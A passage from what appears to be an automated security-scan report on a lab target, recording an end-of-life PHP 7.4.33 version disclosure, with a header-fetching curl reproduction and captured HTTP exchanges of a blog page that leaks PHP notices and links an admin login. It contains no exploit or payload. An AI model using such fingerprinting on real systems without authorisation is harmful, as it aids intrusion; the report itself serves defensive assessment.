support with at least one unpatched RCE-class CVE. Remediation: migrate to a supported PHP branch (8.2+).

**Reproduction**

```
curl -sI http://target.local:32822/ → response header `X-Powered-By: PHP/7.4.33` (present on PHP-handled 200 responses; absent on the static Apache 404). Cross-reference 7.4 against php.net/supported-versions.php (EOL 2022-11-28) and the PHP changelog/CVE feed for the CVEs listed above.
```

**Evidence**

- Evidence `ev-mqy3w489-1t` — `artifacts/_/ev-mqy3w489-1t/`

Request:

```http
GET /verdict-nonexistent-aaa111 HTTP/1.1
Host: target.local:32822
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 279
content-type: text/html; charset=iso-8859-1
date: Sun, 28 Jun 2026 18:12:18 GMT
keep-alive: timeout=5, max=98
server: Apache/2.4.54 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.54 (Debian) Server at target.local Port 32822</address>
</body></html>
```

- Evidence `ev-mqy3w250-1r` — `artifacts/_/ev-mqy3w250-1r/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32822
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 5517
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 18:12:15 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option>        </select>
    </form>

    <div class='post'>
                    <h2>The Magic of Morning Dew</h2>
                    <p>Category: Nature</p>
                    <img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/>
                    <p>Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....</p>
                </div><div class='post'>
                    <h2>Sunset Serenades</h2>
                    <p>Category: Nature</p>
                    <img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/>
                    <p>As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....</p>
                </div><div class='post'>
                    <h2>Forest Whisperings</h2>
                    <p>Category: Nature</p>
                    <img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/>
                    <p>Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....</p>
                </div><div class='post'>
                    <h2>Decoding Tech Trends</h2>
                    <p>Category: Tech</p>
                    <img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/>
                    <p>An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....</p>
                </div><div class='post'>
                    <h2>The Future of Robotics</h2>
                    <p>Category: Tech</p>
                    <img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/>
                    <p>Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....</p>
                </div><div class='post'>
                    <h2>Mediterranean Diet Secrets</h2>
                    <p>Category: Cooking</p>
                    <img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/>
                    <p>Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....</p>
                </div><div class='post'>
                    <h2>The Art of French Baking</h2>
                    <p>Category: Cooking</p>
                    <img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/>
                    <p>Master the art of French baking with these simple steps for making the perfect croissant....</p>
                </div><div class='post'>
                    <h2>Beyond the Camera Lens</h2>
                    <p>Category: Photography</p>
                    <img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/>
                    <p>Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....</p>
                </div><div class='post'>
                    <h2>Urban Photography Tips</h2>
                    <p>Category: Photography</p>
                    <img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/>
                    <p>Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....</p>
                </div><div class='post'>
                    <h2>The Healing Power of Yoga</h2>
                    <p>Category: Health</p>
                    <img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/>
                    <p>Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....</p>
                </div></div>
<a href="admin.php">Admin Login</a>
</body>
</html>
```

- Evidence `ev-mqy3w39k-1s` — `artifacts/_/ev-mqy3w39k-1s/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32822
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 5517
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 18:12:16 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option>        </select>
    </form>

    <div class='post'>
                    <h2>The Magic of Morning Dew</h2>
                    <p>Category: Nature</p>
                    <img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/>
                    <p>Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....</p>
                </div><div class='post'>
                    <h2>Sunset Serenades</h2>
                    <p>Category: Nature</p>
                    <img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/>
                    <p>As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....</p>
                </div><div class='post'>
                    <h2>Forest Whisperings</h2>
                    <p>Category: Nature</p>
                    <img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/>
                    <p>Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....</p>
                </div><div class='post'>
                    <h2>Decoding Tech Trends</h2>
                    <p>Category: Tech</p>
                    <img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/>
                    <p>An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....</p>
                </div><div class='post'>
                    <h2>The Future of Robotics</h2>
                    <p>Category: Tech</p>
                    <img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/>
                    <p>Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....</p>
                </div><div class='post'>
                    <h2>Mediterranean Diet Secrets</h2>
                    <p>Category: Cooking</p>
                    <img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/>
                    <p>Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....</p>
                </div><div class='post'>
                    <h2>The Art of French Baking</h2>
                    <p>Category: Cooking</p>
                    <img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/>
                    <p>Master the art of French baking with these simple steps for making the perfect croissant....</p>
                </div><div class='post'>
                    <h2>Beyond the Camera Lens</h2>
                    <p>Category: Photography</p>
                    <img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/>
                    <p>Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....</p>
                </div><div class='post'>
                    <h2>Urban Photography Tips</h2>
                    <p>Category: Photography</p>
                    <img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/>
                    <p>Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....</p>
                </div><div class='post'>
                    <h2>The Healing Power of Yoga</h2>
                    <p>Category: Health</p>
                    <img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/>
                    <p>Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....</p>
                </div></div>
<a href="admin.php">Admin Login</a>
</body>
</html>
```
